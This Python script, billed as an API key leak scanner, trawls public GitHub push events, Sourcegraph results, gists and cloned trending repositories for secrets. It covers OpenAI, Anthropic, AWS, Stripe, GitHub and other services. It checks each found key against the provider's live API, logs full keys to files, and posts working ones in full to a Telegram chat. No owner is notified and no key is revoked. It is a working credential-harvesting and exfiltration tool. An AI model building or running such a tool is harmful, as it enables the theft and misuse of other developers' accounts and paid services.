import os, re, time, math, json, hashlib, subprocess, tempfile
import requests
from dotenv import load_dotenv
from collections import Counter, defaultdict
from urllib.parse import quote

load_dotenv()

GITHUB_TOKEN = os.getenv("GITHUB_TOKEN")
GITHUB_REPO = os.getenv("GITHUB_REPOSITORY", "")
IS_CI = os.getenv("CI", "").lower() == "true"
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "")
VALIDATE_KEYS = True
MIN_ENTROPY = float(os.getenv("MIN_ENTROPY", "3.6"))
SCAN_PAGES = int(os.getenv("SCAN_PAGES", "10"))

OUTPUT_FILE = "leaked2.txt"
SEEN_KEYS = set()
ALL_FINDINGS = []

HEADERS = {"User-Agent": "API-Leak-Scanner/2.0", "Accept": "application/vnd.github+json"}
if GITHUB_TOKEN:
    HEADERS["Authorization"] = f"Bearer {GITHUB_TOKEN}"

PATTERNS = [
    ("sk-proj-[A-Za-z0-9_-]{20,100}T3BlbkFJ[A-Za-z0-9_-]{20,100}", "OpenAI Project"),
    ("sk-svcacct-[A-Za-z0-9_-]{20,100}T3BlbkFJ[A-Za-z0-9_-]{20,100}", "OpenAI Service Account"),
    ("sk-admin-[A-Za-z0-9_-]{20,100}T3BlbkFJ[A-Za-z0-9_-]{20,100}", "OpenAI Admin"),
    ("sk-[A-Za-z0-9]{20,42}T3BlbkFJ[A-Za-z0-9]{20,42}", "OpenAI Legacy"),
    ("sk-ant-api03-[A-Za-z0-9_-]{70,110}", "Anthropic"),
    ("sk-ant-oat[0-9a-z]+-[A-Za-z0-9_-]{50,90}", "Anthropic"),
    ("AIzaSy[A-Za-z0-9_-]{33}", "Google Gemini"),
    ("xai-[A-Za-z0-9]{30,70}", "xAI Grok"),
    ("sk-[a-f0-9]{32,64}", "DeepSeek"),
    ("sk-or-v1-[A-Za-z0-9_-]{40,100}", "OpenRouter"),
    ("gsk_[a-zA-Z0-9]{45,60}", "Groq"),
    ("hf_[A-Za-z0-9]{30,60}", "HuggingFace"),
    ("r8_[A-Za-z0-9]{30,50}", "Replicate"),
    ("mist_[A-Za-z0-9]{25,60}", "Mistral"),
    ("pplx-[A-Za-z0-9_-]{30,80}", "Perplexity"),
    ("together_[A-Za-z0-9]{30,60}", "Together AI"),
    ("fw_[A-Za-z0-9]{30,50}", "Fireworks"),
    ("(cohere|Cohere)[A-Za-z0-9_-]{30,60}", "Cohere"),
    ("ghp_[A-Za-z0-9]{36,40}", "GitHub PAT"),
    ("github_pat_[A-Za-z0-9_]{60,90}", "GitHub PAT (fine-grained)"),
    ("glpat-[A-Za-z0-9_-]{20,40}", "GitLab PAT"),
    ("xox[baprs]-[A-Za-z0-9-]{20,80}", "Slack Token"),
    ("sk_live_[A-Za-z0-9]{20,40}", "Stripe Live Secret"),
    ("pk_live_[A-Za-z0-9]{20,40}", "Stripe Live Publishable"),
    ("rk_live_[A-Za-z0-9]{20,40}", "Stripe Live Restricted"),
    ("AKIA[0-9A-Z]{16}", "AWS Access Key"),
    ("DefaultEndpointsProtocol=https;AccountName=[A-Za-z0-9]+;AccountKey=[A-Za-z0-9+/=]{40,100}", "Azure Connection String"),
]

ALLOWED_EXTS = {".py", ".js", ".ts", ".jsx", ".tsx", ".java", ".go", ".rb", ".php", ".sh", ".env", ".yml", ".yaml", ".json", ".ini", ".cfg", ".conf", ".toml", ".md", ".txt"}

# ── Utils ──

def entropy(s):
    if len(s) < 20: return 0.0
    c = Counter(s); p = [v/len(s) for v in c.values()]
    return -sum(v * math.log2(v) for v in p if v > 0)

def key_hash(k): return hashlib.sha256(k.encode()).hexdigest()[:16]

def is_already_seen(k):
    h = key_hash(k)
    if h in SEEN_KEYS: return True
    SEEN_KEYS.add(h); return False

def extract_keys(text, source_label):
    if not text: return []
    found = []
    for pat, service in PATTERNS:
        for m in re.finditer(pat, text, re.IGNORECASE):
            k = m.group(0)
            if len(k) < 32: continue
            if re.match(r"^[0-9a-fA-F]{40,}$", k): continue
            if entropy(k) < MIN_ENTROPY: continue
            if is_already_seen(k): continue
            found.append({"service": service, "key": k, "source": source_label})
    return found

# ── Validation ──

def validate(service, key):
    try:
        if "OpenAI" in service:
            r = requests.get("https://api.openai.com/v1/models", headers={"Authorization": f"Bearer {key}"}, timeout=7)
            return r.status_code == 200
        if "Anthropic" in service:
            r = requests.get("https://api.anthropic.com/v1/models", headers={"x-api-key": key}, timeout=7)
            return r.status_code == 200
        if "Google" in service:
            r = requests.get(f"https://generativelanguage.googleapis.com/v1beta/models?key={key}", timeout=7)
            return r.status_code == 200
        if service == "xAI Grok":
            r = requests.get("https://api.x.ai/v1/models", headers={"Authorization": f"Bearer {key}"}, timeout=7)
            return r.status_code == 200
        if service == "Groq":
            r = requests.get("https://api.groq.com/openai/v1/models", headers={"Authorization": f"Bearer {key}"}, timeout=7)
            return r.status_code == 200
        if service == "DeepSeek":
            r = requests.get("https://api.deepseek.com/v1/models", headers={"Authorization": f"Bearer {key}"}, timeout=7)
            return r.status_code == 200
        if service == "OpenRouter":
            r = requests.get("https://openrouter.ai/api/v1/models", headers={"Authorization": f"Bearer {key}"}, timeout=7)
            return r.status_code == 200
        if service == "HuggingFace":
            r = requests.get("https://huggingface.co/api/models?limit=1", headers={"Authorization": f"Bearer {key}"}, timeout=7)
            return r.status_code == 200
        if service == "Replicate":
            r = requests.get("https://api.replicate.com/v1/models", headers={"Authorization": f"Bearer {key}"}, timeout=7)
            return r.status_code == 200
        if service == "Mistral":
            r = requests.get("https://api.mistral.ai/v1/models", headers={"Authorization": f"Bearer {key}"}, timeout=7)
            return r.status_code == 200
        if "GitHub" in service:
            r = requests.get("https://api.github.com/user", headers={"Authorization": f"Bearer {key}"}, timeout=7)
            return r.status_code == 200
        if "Stripe" in service:
            r = requests.get("https://api.stripe.com/v1/balance", auth=(key, ""), timeout=7)
            return r.status_code == 200
    except: return "error"
    return "unknown"

# ── Output + Alert ──

def send_tg(msg):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID: return
    try: requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
        data={"chat_id": TELEGRAM_CHAT_ID, "text": msg, "parse_mode": "HTML"}, timeout=7)
    except: pass

def log_and_alert(item):
    line = f"{item['source']} | {item['service']} | {item['key']} | {item.get('repo','')} | {item.get('file','')} | {item.get('context','')}\n"
    ALL_FINDINGS.append(line)
    with open(OUTPUT_FILE, "a") as f: f.write(line)
    print(f"[{item['service']}] {item['key'][:40]}... from {item['source']}")

    v = validate(item["service"], item["key"])
    status = "LIVE" if v is True else ("REVOKED" if v is False else str(v))
    print(f"  └─ Validation: {status}")

    if v is True:
        msg = (
            f"\U0001f6a8 <b>LIVE KEY FOUND</b>\n\n"
            f"<b>Service:</b> {item['service']}\n"
            f"<b>Key:</b> <code>{item['key']}</code>\n"
            f"<b>Source:</b> {item['source']}\n"
            f"<b>Repo:</b> {item.get('repo', 'N/A')}\n"
            f"<b>File:</b> {item.get('file', 'N/A')}\n"
            f"<b>Context:</b> {item.get('context', 'N/A')}"
        )
        send_tg(msg)

# ══════════════════════════════════════════════
# SOURCE 1: GitHub Public Events
# ══════════════════════════════════════════════

def scan_github_events():
    print("\n--- Source: GitHub Events ---")
    seen_eids = set()
    events = []
    for p in range(1, SCAN_PAGES + 1):
        try:
            r = requests.get("https://api.github.com/events", params={"per_page": 100, "page": p}, headers=HEADERS, timeout=15)
            if r.status_code != 200: break
            batch = r.json()
            if not batch: break
            events.extend(batch)
        except: break
    print(f"  {len(events)} events fetched")

    count = 0
    for ev in reversed(events):
        eid = ev.get("id")
        if not eid or eid in seen_eids: continue
        seen_eids.add(eid)
        if ev.get("type") != "PushEvent": continue

        payload = ev.get("payload", {})
        if "head" not in payload or "before" not in payload: continue
        repo = ev["repo"]["name"]
        cu = f"https://api.github.com/repos/{repo}/compare/{payload['before']}...{payload['head']}"
        try:
            r = requests.get(cu, headers=HEADERS, timeout=10)
            if r.status_code != 200: continue
        except: continue

        for f in r.json().get("files", []):
            patch = f.get("patch", "")
            if not patch: continue
            fn = f["filename"]
            if not any(fn.lower().endswith(e) for e in ALLOWED_EXTS): continue
            for line in patch.splitlines():
                if not line.startswith("+"): continue
                for k in extract_keys(line[1:].strip(), "github-events"):
                    k["repo"] = repo; k["file"] = fn; k["context"] = r.json().get("html_url", "")
                    log_and_alert(k)
        count += 1
    print(f"  Processed {count} push events")

# ══════════════════════════════════════════════
# SOURCE 2: Sourcegraph Code Search
# ══════════════════════════════════════════════

def scan_sourcegraph():
    print("\n--- Source: Sourcegraph ---")
    queries = [
        "T3BlbkFJ lang:dotenv",
        "sk-proj- lang:dotenv",
        "OPENAI_API_KEY lang:dotenv",
    ]
    seen_repos = set()

    for q in queries:
        try:
            r = requests.post("https://sourcegraph.com/.api/graphql", json={
                "query": f'{{ search(query: "{q} patternType:standard") {{ results {{ matchCount results {{ ... on FileMatch {{ file {{ path repository {{ name }} }} }} }} }} }} }}'
            }, timeout=15)
            if r.status_code != 200: continue
            data = r.json()
            for res in data.get("data", {}).get("search", {}).get("results", {}).get("results", []):
                repo = res.get("file", {}).get("repository", {}).get("name", "")
                path = res.get("file", {}).get("path", "")
                if not repo or not path: continue
                repo_name = repo.replace("github.com/", "")
                key = f"{repo_name}/{path}"
                if key in seen_repos: continue
                seen_repos.add(key)

                raw = f"https://raw.githubusercontent.com/{repo_name}/main/{path}"
                try:
                    content = requests.get(raw, timeout=10).text
                    for k in extract_keys(content, "sourcegraph"):
                        k["repo"] = repo_name; k["file"] = path; k["context"] = raw
                        log_and_alert(k)
                except:
                    try:
                        raw2 = f"https://raw.githubusercontent.com/{repo_name}/master/{path}"
                        content = requests.get(raw2, timeout=10).text
                        for k in extract_keys(content, "sourcegraph"):
                            k["repo"] = repo_name; k["file"] = path; k["context"] = raw2
                            log_and_alert(k)
                    except: pass
        except: pass
    print(f"  Checked {len(seen_repos)} unique files")

# ══════════════════════════════════════════════
# SOURCE 3: GitHub Gists
# ══════════════════════════════════════════════

def scan_github_gists():
    print("\n--- Source: GitHub Gists ---")
    queries = ["OPENAI_API_KEY", "sk-proj", "T3BlbkFJ"]
    for q in queries:
        try:
            r = requests.get(f"https://api.github.com/search/code?q={q}+extension:env+is:gist&sort=indexed&order=desc&per_page=30",
                headers=HEADERS, timeout=10)
            if r.status_code != 200: continue
            for item in r.json().get("items", []):
                repo = item.get("repository", {}).get("full_name", "gist")
                fn = item.get("name", "")
                raw = item.get("html_url", "")
                try:
                    ru = item.get("git_url", "")
                    if ru:
                        c = requests.get(ru.replace("git://", "https://").replace(".git", "") + "?raw=true", timeout=10).text
                        for k in extract_keys(c, "gists"):
                            k["repo"] = repo; k["file"] = fn; k["context"] = raw
                            log_and_alert(k)
                except: pass
        except: pass

# ══════════════════════════════════════════════
# SOURCE 4: Trending Repos Gitleaks Scan
# ══════════════════════════════════════════════

def scan_trending():
    print("\n--- Source: Trending Repos (gitleaks) ---")
    try:
        # Get trending repos from GitHub
        r = requests.get("https://api.github.com/search/repositories?q=created:>2024-01-01+language:python&sort=stars&order=desc&per_page=10",
            headers=HEADERS, timeout=10)
        if r.status_code != 200: return
        repos = [(i["full_name"], i["clone_url"]) for i in r.json().get("items", [])[:5]]

        for name, clone_url in repos:
            print(f"  Scanning {name}...")
            tmp = tempfile.mkdtemp()
            try:
                subprocess.run(["git", "clone", "--depth", "1", "--quiet", clone_url, tmp],
                    capture_output=True, timeout=30)
                result = subprocess.run(["gitleaks", "detect", "--source", tmp, "--no-git", "--report-format", "json", "--report-path", "/dev/stdout"],
                    capture_output=True, text=True, timeout=30)
                for line in result.stdout.strip().split("\n"):
                    if not line: continue
                    try:
                        finding = json.loads(line)
                        secret = finding.get("Secret", "")
                        desc = finding.get("Description", "")
                        file = finding.get("File", "")
                        if secret and len(secret) > 10:
                            for k in extract_keys(secret, "trending-gitleaks"):
                                k["repo"] = name; k["file"] = file; k["context"] = f"gitleaks: {desc}"
                                log_and_alert(k)
                    except: pass
            except: pass
            finally:
                subprocess.run(["rm", "-rf", tmp])
    except: pass

# ══════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════

def main():
    print("=" * 60)
    print("  Multi-Source API Key Leak Scanner")
    print(f"  Validation: {'ENABLED (alerting only for LIVE keys)' if VALIDATE_KEYS else 'DISABLED'}")
    print(f"  Entropy threshold: {MIN_ENTROPY}")
    print("=" * 60)

    scan_github_events()
    scan_sourcegraph()
    scan_github_gists()
    scan_trending()

    # Dedup + save findings log
    seen = set()
    unique = []
    for line in ALL_FINDINGS:
        h = key_hash(line)
        if h not in seen:
            seen.add(h); unique.append(line)

    print(f"\n{'=' * 60}")
    print(f"  Total unique findings: {len(unique)}")

    if unique:
        with open("findings_new.txt", "w") as f:
            f.writelines(unique)
        print(f"  Written to findings_new.txt")

    if IS_CI and unique:
        # Merge with existing findings.log
        existing = set()
        try:
            with open("findings.log") as f:
                for line in f: existing.add(line.strip())
        except: pass
        with open("findings.log", "a") as f:
            for line in unique:
                if line.strip() not in existing:
                    f.write(line)

    print("Done.")

if __name__ == "__main__":
    main()
